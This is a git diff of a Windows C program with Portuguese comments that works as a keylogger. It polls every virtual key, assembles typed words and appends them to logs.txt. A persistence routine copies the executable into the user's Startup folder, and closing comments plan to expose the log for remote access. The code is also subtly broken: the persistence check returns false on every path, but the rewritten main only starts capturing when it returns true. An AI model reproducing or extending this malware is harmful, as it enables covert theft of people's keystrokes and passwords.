@@ -9,85 +9,85 @@ bool valPersis();
 
 int main()
 {
-    valPersis();
-
     FILE *fptr;
 
     char palavra[100];
     int count = 0;
-    
+
     printf("Precione qualquer tecla...\n\n");
 
-    while (1)
+    if (valPersis())
     {
-        for (int vk = 0x08; vk <= 0xFE; vk++)
+        while (1)
         {
-            if (GetAsyncKeyState(vk) & 0x01)
+            for (int vk = 0x08; vk <= 0xFE; vk++)
             {
-                // Mapeia o código virtual para scan code
-                UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);
-
-                // Monta o valor lParam como se viesse de uma mensagem WM_KEYDOWN
-                LONG lParam = (scanCode << 16);
-
-                // Buffer para o nome da tecla
-                char keyName[128];
-                if (GetKeyNameTextA(lParam, keyName, sizeof(keyName)) > 0)
+                if (GetAsyncKeyState(vk) & 0x01)
                 {
+                    // Mapeia o código virtual para scan code
+                    UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);
 
-                    // Backspace
-                    if (vk == VK_BACK)
+                    // Monta o valor lParam como se viesse de uma mensagem WM_KEYDOWN
+                    LONG lParam = (scanCode << 16);
+
+                    // Buffer para o nome da tecla
+                    char keyName[128];
+                    if (GetKeyNameTextA(lParam, keyName, sizeof(keyName)) > 0)
                     {
-                        if (count > 0)
+
+                        // Backspace
+                        if (vk == VK_BACK)
                         {
-                            count--;
-                            palavra[count] = '\0';
+                            if (count > 0)
+                            {
+                                count--;
+                                palavra[count] = '\0';
+                            }
+                            system("cls");
+                            printf("%s", palavra);
+                            continue;
+                        }
+
+                        // Enter ou espaço, salva o arquivo
+                        if (vk == VK_RETURN || vk == VK_SPACE)
+                        {
+                            if (count > 0)
+                            {
+
+                                // Finalizando o arquivo log txt
+                                palavra[count] = '\0';
+
+                                // Salavando arquivo
+                                fptr = fopen("logs.txt", "a");
+                                fprintf(fptr, "%s\n", palavra);
+                                fclose(fptr);
+
+                                count = 0;
+                                palavra[0] = '\0';
+                                system("cls");
+                            }
+                            continue;
+                        }
+
+                        //  Salvando as teclas e montando a palavra
+                        if ((vk >= '0' && vk <= '9') || (vk >= 'A' && vk <= 'Z') || (vk >= 'a' && vk <= 'z'))
+                        {
+                            if (count < sizeof(palavra) - 1)
+                            {
+                                palavra[count++] = (char)vk;
+                                palavra[count] = '\0';
+                            }
                         }
                         system("cls");
                         printf("%s", palavra);
-                        continue;
-                    }
-                    
-                    // Enter ou espaço, salva o arquivo
-                    if (vk == VK_RETURN || vk == VK_SPACE)
-                    {
-                        if (count > 0)
-                        {
-                            
-                            // Finalizando o arquivo log txt
-                            palavra[count] = '\0';
-                            
-                            // Salavando arquivo
-                            fptr = fopen("logs.txt", "a");
-                            fprintf(fptr, "%s\n", palavra);
-                            fclose(fptr);
-                            
-                            count = 0;
-                            palavra[0] = '\0';
-                            system("cls");
-                        }
-                        continue;
-                    }
 
-                    //  Salvando as teclas e montando a palavra
-                    if ((vk >= '0' && vk <= '9') || (vk >= 'A' && vk <= 'Z'))
-                    {
-                        if (count < sizeof(palavra) - 1)
-                        {
-                            palavra[count++] = (char)vk;
-                            palavra[count] = '\0';
-                        }
+                        if (scanCode == 1) return 0;
                     }
-                    system("cls");
-                    printf("%s", palavra);
-
-                    if (scanCode == 1) break;
                 }
             }
+
+            Sleep(30);
         }
-        
-        
-        Sleep(30);
     }
 
     return 0;
@@ -98,8 +98,8 @@ bool valPersis()
     FILE *varsConf;
 
     char chave[50], valor[50];
-    int VerdOuFal = 0;// Verdadeiro ou falso
-    
+    int VerdOuFal = 0; // Verdadeiro ou falso
+
     varsConf = fopen("config.cfg", "r");
     if (!varsConf)
     {
@@ -112,21 +112,22 @@ bool valPersis()
         if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath)))
         {
             snprintf(newPath, MAX_PATH, "%s\\main.exe", startupPath);
-            
-            CopyFile(currentPath, newPath, FALSE);
+            if (strcmp(currentPath, newPath) != 0)
+            {
+                CopyFile(currentPath, newPath, FALSE);
+                return false;
+            }
         }
 
         varsConf = fopen("config.cfg", "w");
-        fprintf(varsConf, "pos=0");// pos == true
+        fprintf(varsConf, "pos=0\n");
         fclose(varsConf);
-    }
 
+    }
     return false;
 }
 
-
-
 // Servir esse arquivo de log abrindo um caminho para acesso remoto ou compartilhando esse arquivo localmente
 // shell:startup
-// se auto copiar 
+// se auto copiar
 // ao inves de ter que criar dois arquivos vou fazer um arquivo config onde vai ser salvo se o arquivo ja foi copiado ou nao
